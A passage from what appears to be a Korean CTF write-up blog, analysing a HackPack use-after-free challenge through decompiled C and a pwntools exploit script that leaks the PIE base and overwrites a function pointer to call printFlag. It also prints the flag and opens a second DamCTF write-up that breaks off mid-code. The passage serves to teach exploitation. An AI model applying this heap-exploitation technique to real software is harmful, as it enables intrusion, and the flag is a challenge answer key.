class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !_func_result )</span><br><span class="line">          _func_result = createRandomNum();</span><br><span class="line">        func_result = ((__int64 (*)(<span class="type">void</span>))_func_result[<span class="number">2</span>])();<span class="comment">// printFlag Ïã§ÌñâÌï¥ÏïºÌï®</span></span><br><span class="line">        _func_result[<span class="number">1</span>] = *_func_result;</span><br><span class="line">        *_func_result = func_result;</span><br><span class="line">        <span class="keyword">goto</span> print_random_num;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">print_random_num:</span><br><span class="line">        <span class="keyword">if</span> ( _func_result )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, *_func_result);       </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          printStr(<span class="string">&quot;No Random Number has been generated\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8u</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Access Denied\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">9u</span>:</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        printStr(<span class="string">&quot;Option does not exist\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printStr(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( _func_result )</span><br><span class="line">    <span class="built_in">free</span>(_func_result);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(&amp;Number_obj_copy[<span class="number">16</span> * j], <span class="string">&quot;none&quot;</span>) )</span><br><span class="line">      <span class="built_in">free</span>((<span class="type">void</span> *)Number_obj[j]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">free</span>(Number_obj_copy);</span><br><span class="line">  <span class="built_in">free</span>(Number_obj);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ÏùºÎã® 1Î≤à Î©îÎâ¥Î•º ÏÇ¥Ìé¥Î≥¥Ïûê. <code>createStaticNum</code> Ìï®ÏàòÏù¥Îã§. Ï∞∏Í≥†Î°ú Ïó¨Îü¨ Í∏∞Îä•ÏùÑ Ïã§ÌñâÌïòÍ∏∞ Ï†ÑÏóê <code>getUserNum</code> Ìï®ÏàòÎ•º ÌÜµÌï¥ Ïù∏Îç±Ïä§Î•º Î∞õÏïÑÏò§ÎäîÎç∞ ÏùåÏàòÎ•º Ïûò Í±∞Î•¥Í≥† ÏûàÏúºÎãà oobÏôÄ Í∞ôÏùÄ Ï∑®ÏïΩÏ†êÏù¥ Î∞úÏÉùÌï† Ïàò ÏóÜÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *__fastcall <span class="title function_">createStaticNum</span><span class="params">(<span class="type">int</span> idx, __int64 obj)</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD *name_ptr; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  name_ptr = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  printStr(<span class="string">&quot;Enter object name: &quot;</span>);</span><br><span class="line">  getName(name_ptr);</span><br><span class="line">  printStr(<span class="string">&quot;Enter number: &quot;</span>);</span><br><span class="line">  name_ptr[<span class="number">2</span>] = getUserNum();</span><br><span class="line">  result = name_ptr;</span><br><span class="line">  *(_QWORD *)(obj + <span class="number">8LL</span> * idx) = name_ptr;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>idx</code>ÏôÄ <code>obj</code>Í∞Ä Ïù∏ÏûêÎ°ú ÎÑòÏñ¥ÏôîÎã§. <code>malloc</code>ÏùÑ ÌÜµÌï¥ÏÑú <code>name</code>ÏùÑ ÏûÖÎ†•Î∞õÎäî Í≥µÍ∞ÑÏùÑ Ìï†ÎãπÌïúÎã§. Í∑∏Îü¨ÎãàÍπê <code>obj</code>Îäî ÏïÑÎûòÏ≤òÎüº ÏÉùÍ≤ºÎã§. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">name_ptr + 0x00: name</span><br><span class="line">name_ptr + 0x10: name</span><br><span class="line">name_ptr + 0x18: num</span><br><span class="line">...</span><br><span class="line">obj + 0x00: name_ptr </span><br><span class="line">obj + 0x08: name_ptr A</span><br><span class="line">obj + 0x10: name_ptr B</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>ÎîîÎ≤ÑÍπÖÌïòÎ©¥ÏÑú Ï≤òÏùå ÏïåÍ≤åÎêòÏóàÎäîÎç∞ Îä¶Í≤å mallocÎêòÎ©¥ Ï£ºÏÜåÍ∞Ä ÏúÑÎ°ú Ïò¨ÎùºÍ∞ÑÎã§. </p><p>Ïù¥Ï†ú <code>deleteObject</code> Ìï®ÏàòÎ•º ÏÇ¥Ìé¥Î≥¥Ïûê.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">deleteObject</span><span class="params">(<span class="type">int</span> idx, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">free</span>(*(<span class="type">void</span> **)(<span class="number">8LL</span> * idx + a2));             <span class="comment">// freeÌïòÍ≥† ÎÇòÏÑú Îç∞Ïù¥ÌÑ∞Î•º Ï¥àÍ∏∞Ìôî ÏãúÏºúÏ§òÏïºÌïòÎäîÎç∞ Ïïà ÏãúÏºúÏ§å</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ï£ºÏÑùÏóêÎèÑ Ï†ÅÌòÄÏûàÎìØÏù¥, <code>free</code>ÌïòÍ≥† ÎÇòÏÑú Îç∞Ïù¥ÌÑ∞ÎèÑ Ìï®Íªò Ï¥àÍ∏∞Ìôî ÏãúÏºúÏ§òÏïºÌïòÎäîÎç∞ Ïïà ÏãúÏºúÏ§¨Îã§. Í∑∏Îü¨Î©¥ Îç∞Ïù¥ÌÑ∞Í∞Ä Í∑∏ÎåÄÎ°ú ÎÇ®ÏïÑÏûàÍ≤å ÎêúÎã§.</p><ul><li><p>ÏûÖÎ†•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">createStaticNum(0, &#x27;aaaa&#x27;, 1234)</span><br></pre></td></tr></table></figure></li><li><p>free Ï†Ñ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># name_ptr</span><br><span class="line">0x55fa7d9683b0: 0x0000000061616161      0x0000000000000000</span><br><span class="line">0x55fa7d9683c0: 0x00000000000004d2</span><br><span class="line"></span><br><span class="line"># obj</span><br><span class="line">0x55fa7d9682a0: 0x000055fa7d9683b0</span><br></pre></td></tr></table></figure></li><li><p>free ÌõÑ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># name_ptr</span><br><span class="line">0x55fa7d9683b0: 0x000000055fa7d968      0x672609a652e683d0</span><br><span class="line">0x55fa7d9683c0: 0x00000000000004d2</span><br><span class="line"></span><br><span class="line"># obj</span><br><span class="line">0x55fa7d9682a0: 0x000055fa7d9683b0</span><br></pre></td></tr></table></figure></li></ul><p><code>name</code> Î∂ÄÎ∂ÑÏùÄ Ïù¥ÏÉÅÌï¥Ï°åÎäîÎç∞,.. <code>num</code>ÏùÄ Í∑∏ÎåÄÎ°ú Î≥¥Ï°¥ÎêòÏñ¥ ÏûàÎã§. Ìï¥Ï†ú ÌõÑÏóêÎèÑ Ïù¥ Í∞íÏùÑ Ïù¥Ïö©Ìï† Ïàò ÏûàÍ∏∞ ÎïåÎ¨∏Ïóê Ïù¥ Í∞íÏùÑ Ïù¥Ïö©Ìï† Í≤ÉÏù¥Îã§. (int)ÎùºÏÑú Ï£ºÏÜå ÎÑ£Í∏∞ Îî± Ï¢ãÏïÑÎ≥¥Ïù∏Îã§.</p><p>Ïù¥Ï†ú Îòê Îã§Î•∏ <code>malloc</code>ÏùÑ Ï∞æÏùÑ Í≤ÉÏù¥Îã§. ÏôúÎÉêÌïòÎ©¥ <code>heap chunk</code>Î•º Ìï¥Ï†úÌïòÍ≥† ÎòëÍ∞ôÏùÄ ÌÅ¨Í∏∞Ïùò <code>heap chunk</code>Î•º Ìï†ÎãπÌïòÎ©¥ ÎèôÏùºÌïú ÏúÑÏπòÌïúÎã§Îäî Í≤ÉÏùÑ Ïù¥Ïö©Ìï† Í≤ÉÏù¥Í∏∞ ÎïåÎ¨∏Ïù¥Îã§. <code>malloc</code>ÏùÑ ÏÇ¨Ïö©ÌïòÎäî Í≥≥Ïù¥ Ï¥ù Îëê Í≥≥ ÏûàÎäîÎç∞, ÌïòÎÇòÎäî ÏúÑÏùò  <code>createStaticNum</code> Ìï®ÏàòÏù¥Í≥† Îã§Î•∏ ÌïòÎÇòÎäî <code>createRandomNum</code>Ïù¥Îã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_QWORD *<span class="title function_">createRandomNum</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  _QWORD *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  srand(<span class="number">0</span>);</span><br><span class="line">  buf = <span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">  buf[<span class="number">2</span>] = generateRandNum;                     <span class="comment">// Ìï®Ïàò Ìè¨Ïù∏ÌÑ∞</span></span><br><span class="line">  buf[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  *buf = <span class="number">0LL</span>;</span><br><span class="line">  write(<span class="number">1</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">  <span class="keyword">return</span> buf;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Ïù¥ Íµ¨Ï°∞Îäî ÏïÑÎûòÏôÄ Í∞ôÏù¥ ÏÉùÍ≤ºÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">buf + 0x00: 0</span><br><span class="line">buf + 0x10: 0</span><br><span class="line">buf + 0x18: generateRandNum func_ptr</span><br></pre></td></tr></table></figure><p>Ïù¥ Íµ¨Ï°∞Îäî Î≠îÍ∞Ä ÏïÑÍπå ÏúÑÏóêÏÑú Î≥∏ name_ptrÍ≥º Ïú†ÏÇ¨ÌïòÎã§. ÏÑúÎ°ú Îã§Î•∏ Íµ¨Ï°∞Ï≤¥Í∞Ä ÏûàÎäîÎç∞ Ïö©ÎèÑÎäî Îã§Î•¥ÏßÄÎßå ÌÅ¨Í∏∞Í∞Ä ÎèôÏùºÌïòÎã§. A Ïö©ÎèÑÏóêÏÑú Ìï¥Ï†úÌï† Îïå Îç∞Ïù¥ÌÑ∞Í∞Ä Ï¥àÍ∏∞ÌôîÍ∞Ä ÎêòÏßÄ ÏïäÏïÑ B Ïö©ÎèÑÏùº Îïå ÏÇ¨Ïö©Îê† Ïàò ÏûàÎã§. uaf Ï∑®ÏïΩÏ†êÏùÄ Î≥¥ÌÜµ Ïù¥Î†áÍ≤å Ïù¥Ïö©ÎêúÎã§. </p><p><code>createRandomNum</code> Ìï®ÏàòÎäî ÏïÑÎûòÏôÄ Í∞ôÏù¥ <code>main</code> Ìï®ÏàòÏóêÏÑú Ìò∏Ï∂úÎêòÍ≥† Ïù¥Ïö©ÎêúÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main</span></span><br><span class="line">      <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">        <span class="keyword">if</span> ( !_func_result )</span><br><span class="line">          _func_result = createRandomNum();</span><br><span class="line">        func_result = ((__int64 (*)(<span class="type">void</span>))_func_result[<span class="number">2</span>])();<span class="comment">// printFlag Ïã§Ìñâ</span></span><br><span class="line">        _func_result[<span class="number">1</span>] = *_func_result;</span><br><span class="line">        *_func_result = func_result;</span><br><span class="line">        <span class="keyword">goto</span> print_random_num;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7u</span>:</span><br><span class="line">print_random_num:</span><br><span class="line">        <span class="keyword">if</span> ( _func_result )</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, *_func_result);       </span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">          printStr(<span class="string">&quot;No Random Number has been generated\n&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p><code>_func_result</code>Í∞Ä ÏóÜÎäî Í≤ΩÏö∞ <code>createRandomNum</code> Ìï®ÏàòÎ•º ÌÜµÌï¥ ÎûúÎç§Ìïú ÏàòÎ•º Î∞õÏïÑÏò®Îã§. ÎûúÎç§Ìïú ÏàòÎ•º Ïñ¥ÎñªÍ≤å Î∞õÏïÑÏò§ÎÉê? <code>func_result = ((__int64 (*)(void))_func_result[2])();</code> Ïù¥ ÎùºÏù∏ÏùÑ ÌÜµÌï¥ <code>createRandomNum</code> Ìï®ÏàòÏóêÏÑú Î©îÎ™®Î¶¨Ïóê Ï†ÄÏû•Ìïú <code>generateRandNum</code> Ìï®Ïàò Ìè¨Ïù∏ÌÑ∞Î•º Ïã§ÌñâÌïúÎã§. Í∑∏ Í≤∞Í≥ºÎ•º 7Î≤à Î©îÎâ¥ÏóêÏÑú Ï∂úÎ†•Ìï† Ïàò ÏûàÎã§. </p><p>Ïö∞Î¶¨Îäî <code>generateRandNum</code> Ìï®Ïàò ÎåÄÏã† <code>printFlag</code> Ìï®ÏàòÎ•º Ïã§ÌñâÌï† Í≤ÉÏù¥Îã§. Í∑∏Îü¨Î©¥ Î∞îÎ°ú <code>func_result = ((__int64 (*)(void))_func_result[2])();</code> Ïù¥ ÎùºÏù∏ÏóêÏÑú Ìï®ÏàòÍ∞Ä Ïã§ÌñâÎêòÏñ¥ <code>flag.txt</code>Í∞Ä Î≥¥Ïùº Í≤ÉÏù¥Îã§.</p><h3 id="How-to-leak"><a href="#How-to-leak" class="headerlink" title="How to leak"></a>How to leak</h3><p>Î¨∏Ï†úÎäî Ïù¥ Î¨∏Ï†úÏóê <code>pie</code>Í∞Ä Í±∏Î†§ÏûàÎã§. <code>leak</code>ÏùÄ Ïñ¥ÎñªÍ≤å ÌïòÎ©¥ Ï¢ãÏùÑÍπå? ÏïÑÎûò Ìï®ÏàòÎ•º Ïù¥Ïö©ÌïòÏûê.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">readObject</span><span class="params">(<span class="type">int</span> idx, __int64 a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  s = *(<span class="type">char</span> **)(<span class="number">8LL</span> * idx + a2);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;%ld\n&quot;</span>, *((_QWORD *)s + <span class="number">2</span>));   <span class="comment">// Ï£ºÏÜå leak</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>*((_QWORD *)s + 2)</code>ÏùÑ Ï∂úÎ†•ÌïòÎäî Í≤ÉÏúºÎ°ú Î≥¥ÏïÑ <code>name_ptr</code>Ïùò <code>num</code>ÏùÑ Ï∂úÎ†•Ìï¥Ï§ÄÎã§. Ïù¥ Ìï®ÏàòÎ•º ÌÜµÌï¥ <code>leak</code>ÏùÑ Ìï† Ïàò ÏûàÎäîÎç∞, Î®ºÏ†Ä <code>obj</code> Íµ¨Ï°∞Ï≤¥Î•º ÎßåÎì§Í≥† Ìï¥Ï†úÌïúÎã§. Í∑∏ Îã§Ïùå <code>createRandomNum</code> Ìï®ÏàòÎ•º ÌÜµÌï¥ <code>obj[x]</code>Í∞Ä Í∞ÄÎ¶¨ÌÇ§Îäî <code>name_ptr+2</code> Ï¶â <code>num</code> ÏúÑÏπòÏóê <code>generateRandNum</code> Ìï®Ïàò Ìè¨Ïù∏ÌÑ∞Í∞Ä ÏúÑÏπòÌïòÍ≤å ÌïúÎã§. ÎßàÏßÄÎßâÏúºÎ°ú <code>readObject</code> Ìï®ÏàòÎ•º Ïã§ÌñâÏãúÏºú <code>generateRandNum</code> Ìï®ÏàòÏùò Ï£ºÏÜåÎ•º Íµ¨ÌïòÍ≥† <code>pie address</code>ÍπåÏßÄ Íµ¨Ìï† Ïàò ÏûàÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li><code>createStaticNum</code> Ìï®ÏàòÎ•º Ïù¥Ïö©ÌïòÏó¨ <code>malloc</code></li><li><code>deleteObject</code> Ìï®ÏàòÎ•º Ïù¥Ïö©ÌïòÏó¨ <code>free</code></li><li><code>createRandomNum</code> Ìï®ÏàòÎ•º Ïù¥Ïö©ÌïòÏó¨ <code>num</code> ÏúÑÏπòÏóê <code>func_ptr</code>Ïù¥ ÏúÑÏπòÌïòÎèÑÎ°ù <code>malloc</code></li><li><code>readObject</code> Ìï®ÏàòÎ•º Ïù¥Ïö©ÌïòÏó¨ <code>pie</code> Ï£ºÏÜå <code>leak</code></li><li><code>deleteObject</code> Ìï®ÏàòÎ•º Ïù¥Ïö©ÌïòÏó¨ <code>free</code></li><li><code>createStaticNum</code> Ìï®ÏàòÎ•º Ïù¥Ïö©ÌïòÏó¨ <code>malloc</code> Ïù¥ Îïå <code>num</code> ÏúÑÏπòÏóê <code>printFlag</code> Ìï®Ïàò Ï£ºÏÜå ÏûÖÎ†•</li><li><code>deleteObject</code> Ìï®ÏàòÎ•º Ïù¥Ïö©ÌïòÏó¨ <code>free</code></li><li><code>6</code>Î≤à Î©îÎâ¥Î•º Ïù¥Ïö©ÌïòÏó¨ <code>printFlag</code> Ìï®Ïàò Ïã§Ìñâ<ul><li>Ïù¥Í≤ÉÏù¥ Í∞ÄÎä•Ìïú Ïù¥Ïú†Í∞Ä ÏïÑÎûòÏôÄ Í∞ôÏù¥ ÌÉúÏ¥àÏóê Ìïú Î≤àÎßå randomÌïú ÏàòÎ•º Î∞õÍ∏∞ ÎïåÎ¨∏Ïù¥Îã§. <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">    <span class="keyword">if</span> ( !_func_result )</span><br><span class="line">    _func_result = createRandomNum();</span><br><span class="line">    func_result = ((__int64 (*)(<span class="type">void</span>))_func_result[<span class="number">2</span>])();<span class="comment">// printFlag Ïã§Ìñâ</span></span><br></pre></td></tr></table></figure></li><li>3Î≤à Í≥ºÏ†ïÏóêÏÑú <code>createRandomNum</code> Ìï®ÏàòÎ•º Ìïú Î≤à Ïã§ÌñâÌñàÏúºÎØÄÎ°ú <code>_func_result</code>ÏùÄ Ïù¥ÎØ∏ Í∞íÏù¥ Ï±ÑÏõåÏ†∏ÏûàÎã§.</li></ul></li></ol><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./chal&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;cha.hackpack.club&#x27;</span>, <span class="number">41705</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chal&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createStaticNum</span>(<span class="params">idx, name, addr</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(0-9): &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name: &#x27;</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;number: &#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">deleteObject</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(0-9): &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak pie</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readObject</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;(0-9): &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createRandomNum</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># show flag.txt</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showRandomNum</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;option: &#x27;</span>, <span class="built_in">str</span>(<span class="number">7</span>))</span><br><span class="line"></span><br><span class="line">createStaticNum(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="number">1234</span>)</span><br><span class="line">deleteObject(<span class="number">0</span>)</span><br><span class="line">createRandomNum()</span><br><span class="line">readObject(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvline(), <span class="number">10</span>) - <span class="number">0x1257</span></span><br><span class="line">info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">deleteObject(<span class="number">0</span>)</span><br><span class="line">createStaticNum(<span class="number">0</span>, <span class="string">&#x27;aaaa&#x27;</span>, e.address + <span class="number">0x1244</span>) <span class="comment"># e.sym[&#x27;printFlag&#x27;]</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">deleteObject(<span class="number">0</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">createRandomNum()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;n3v3r_tru5t_fr33_jVmVsEuj&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> HackPack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> uaf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dam CTF 2023 - baby-review (fsb)</title>
      <link href="/230414-damctf2023-baby-review/"/>
      <url>/230414-damctf2023-baby-review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1872">https://ctftime.org/event/1872</a></li></ul><blockquote><p>unknown</p></blockquote><ul><li>[? solves &#x2F; ? points]</li></ul><p>Î°∏ÏóÖÏùÑ ÎÑàÎ¨¥ Îä¶Í≤å ÏûëÏÑ±Ìï¥ÏÑú ÏÇ¨Ïù¥Ìä∏Í∞Ä Îã´ÌòîÎã§.. ÎÇ¥Í∞Ä 41Î≤àÏß∏Î°ú ÌíÄÏóàÎçò Í≤É Í∞ôÎã§.</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">char</span> input[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *country; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+4Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = time(<span class="number">0LL</span>);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  srand(v3);</span><br><span class="line">  load_countries(v4, argv);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Alright I need to prove you&#x27;re human so lets do some geography&quot;</span>);</span><br><span class="line">  v8 = rand() % num_countries;</span><br><span class="line">  country = (<span class="type">char</span> *)&amp;countries + <span class="number">100</span> * v8;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;What is the capital of %s?\n&quot;</span>, country);</span><br><span class="line">  fgets(input, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  input[<span class="built_in">strcspn</span>(input, <span class="string">&quot;\r\n&quot;</span>)] = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(input, country + <span class="number">50</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Incorrect. The capital of %s is 